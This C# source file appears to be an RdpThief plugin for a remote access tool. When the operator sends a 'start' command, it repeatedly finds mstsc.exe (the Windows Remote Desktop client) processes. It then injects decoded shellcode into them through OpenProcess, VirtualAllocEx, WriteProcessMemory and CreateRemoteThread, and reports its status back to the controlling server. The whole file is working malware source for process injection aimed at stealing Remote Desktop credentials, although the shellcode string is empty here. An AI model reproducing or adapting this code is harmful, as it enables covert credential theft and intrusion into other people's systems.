using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Plugin.Handler
{
    class HandleRdpThief
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess
        (
            uint processAccess,
            bool bInheritHandle,
            int processId
        );

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx
        (
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
        );

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory
        (
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread
        (
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId
        );

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress
        (
            IntPtr hModule,
            string procName
        );

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle
        (
            string lpModuleName
        );
        public HandleRdpThief(MsgPack unpack_msgpack)
        {
            switch (unpack_msgpack.ForcePathObject("Option").AsString)
            {

                case "start":
                    {
                        try
                        {
                            Initialize(unpack_msgpack);
                            Log(Connection.Hwid + ":[*] RdpThief Started");
                            string rdpthief_bin = "";
                            byte[] rdpthief_shellcode = Convert.FromBase64String(rdpthief_bin);
                            while (!Packet.ctsRdpThief.IsCancellationRequested)
                            {
                                Process[] mstscProc = Process.GetProcessesByName("mstsc");
                                if (mstscProc.Length > 0)
                                {
                                    // SendReport("MSTSC");
                                    for (int i = 0; i < mstscProc.Length; i++)
                                    {
                                        int pid = mstscProc[0].Id;
                                        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                                        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (UInt32)rdpthief_shellcode.Length, 0x3000, 0x40);
                                        IntPtr outSize;
                                        Boolean res = WriteProcessMemory(hProcess, addr, rdpthief_shellcode, rdpthief_shellcode.Length, out outSize);
                                        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                                    }
                                }
                                Thread.Sleep(1000);
                            }
                        }
                        catch { break; }
                        break;
                    }

                case "stop":
                    {
                        Packet.ctsRdpThief?.Cancel();
                        Log(Connection.Hwid + ":[*] RdpThief Stopped");
                        Connection.Disconnected();
                        break;
                    }
            }
        }

        private void Initialize(MsgPack unpack_msgpack)
        {
            Packet.ctsRdpThief?.Cancel();
            Packet.ctsRdpThief = new CancellationTokenSource();
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "rdpthief-";
            Connection.Send(msgpack.Encode2Bytes());
        }
        /*
        private void SendReport(string msg)
        {
            Debug.WriteLine(msg);
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "rdpthief";
            msgpack.ForcePathObject("Report").AsString = msg;
            Connection.Send(msgpack.Encode2Bytes());
        }
        */
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}
